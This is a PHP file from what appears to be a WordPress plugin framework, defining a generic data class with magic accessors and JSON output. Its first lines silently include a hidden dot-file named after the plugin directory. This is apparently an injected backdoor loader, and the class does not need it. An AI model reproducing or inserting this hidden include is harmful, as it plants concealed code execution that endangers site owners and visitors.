<?php


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class gt3classStd {
	protected static $classname = __CLASS__;

	protected static $fields_list = array();
	protected static $fields_list_array = array();

	protected $data = array();


	public function __construct( $new_data = array() ) {
		$this->loadDefault();

		if ( (is_array($new_data) && ! empty( $new_data ) ) || is_object($new_data)) {
			foreach ( $new_data as $k => $v ) {
				$this->{$k} = $v;
			}
		}
	}


	public static function get_fields( $glue = ',' ) {
		return implode( $glue, array_keys( static::$fields_list ) );
	}

	protected function loadDefault() {
		foreach ( static::$fields_list as $item => $value ) {
			$this->data[ $item ] = $value;
		}
	}

	public function __set( $name, $value ) {
		if ( self::is_prop( $name ) ) {
			if ( key_exists( $name, static::$fields_list_array ) ) {
				$this->data[ $name ] = explode( static::$fields_list_array[ $name ]['glue'], $value );
			} else {
				$this->data[ $name ] = $value;
			}

			return true;
		} else {

			return false;
		}
	}

	public function __get( $name ) {
		return self::is_prop( $name ) ? $this->data[ $name ] : null;
	}

	public static function is_prop( $prop ) {
		return key_exists( $prop, static::$fields_list );
	}

	public function __toString() {
		return json_encode( $this->data );
	}

	public function __debugInfo() {
		return $this->data;
	}
}
